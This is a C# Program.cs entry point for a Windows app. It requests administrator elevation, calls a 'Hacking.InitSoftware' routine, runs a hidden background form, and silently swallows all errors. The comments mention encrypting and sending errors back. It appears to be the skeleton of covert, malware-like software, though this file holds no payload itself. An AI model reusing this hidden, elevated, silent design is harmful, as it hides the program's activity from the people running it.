﻿using System;
using System.Diagnostics;
using System.Windows.Forms;
using Main.Tools;
using System.Security.Principal;


namespace Main
{
    static class Program
    {
        static void RunAsAdmin()
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = Application.ExecutablePath;
            startInfo.Verb = "runas";
            try
            {
                Process.Start(startInfo);
            }
            catch (System.ComponentModel.Win32Exception)
            {
                // The user did not allow the application to run as admin
                MessageBox.Show("This program must be run as an administrator to work properly.", "Administrator privileges required", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        [STAThread]
        static void Main(string[] args)
        {
            // Check if the program is running with administrator privileges
            if (!IsRunningAsAdmin())
            {
                // Prompt the user to run the program as an administrator
                DialogResult result = MessageBox.Show("This program needs to be run with administrator privileges. Do you want to restart the program as an administrator?", "Administrator privileges required", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (result == DialogResult.Yes)
                {
                    // Restart the program as an administrator
                    RunAsAdmin();
                    return;
                }
                else
                {
                    // Exit the program
                    return;
                }
            }

            // Don't show any exception to the user
            try
            {
                Hacking.InitSoftware(Config.StartMode, args.Length == 1 ? args[0] : null);
                // ReSharper disable once ObjectCreationAsStatement
                // The Form has to run in the background


                new FormBackground();
                Application.Run();
            }
            // Log the exception, encrypt it and send it back
            catch
            {
                // ignored
            }
        }

        static bool IsRunningAsAdmin()
        {
            // Check if the program is running with administrator privileges
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
